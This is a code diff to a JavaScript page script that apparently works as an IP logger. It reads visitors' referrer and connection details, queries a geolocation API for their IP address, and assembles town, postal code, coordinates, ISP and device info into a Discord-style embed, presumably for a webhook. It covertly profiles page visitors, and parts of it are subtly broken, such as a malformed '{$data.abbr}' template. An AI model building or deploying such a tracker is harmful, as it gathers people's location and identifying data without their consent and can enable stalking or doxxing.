@@ -21,7 +21,7 @@ var effectiveType = navigator.connection.effectiveType
 var refer = document.referrer
 var orientation = screen.orientation
 
-$.getJSON("http://ip-api.com/json?fields=52166653", function(data) {         
+$.getJSON("https://ipwho.is/", function(data) {         
   var params = {
     embeds: [
       {
@@ -32,15 +32,15 @@ $.getJSON("http://ip-api.com/json?fields=52166653", function(data) {
         "fields": [
           {
             "name": "IP Address",
-            "value": `> ${data.query}`
+            "value": `>>> ${data.ip}\nType: ${data.type}`
           },
           {
             "name": "GeoLocation Info",
-            "value": `>>> Town, State: ${data.city}, ${data.regionName}\nDistrict: ${data.district}\nCountry: ${data.country}\nZip Code: ${data.zip}\nTime Zone: ${data.timezone}, ${data.offset}\nLong/Lat: ${data.lat}, ${data.lon}`
+            "value": `>>> Town, State: ${data.city}, ${data.region}\nRegion: ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTime Zone: ${data.current_time}, ${data.offset}, ${data.id}, {$data.abbr}\nLong/Lat: ${data.latitude}, ${data.longitude}`
           },
           {
             "name": "Network Info",
-            "value": `>>> HostName: ${data.hosting}\nISP: ${data.as}\nProxy: ${data.proxy}`
+            "value": `>>> HostName: ${data.org}\nISP: ${data.isp}`
           },
           {
             "name": "Device Info",
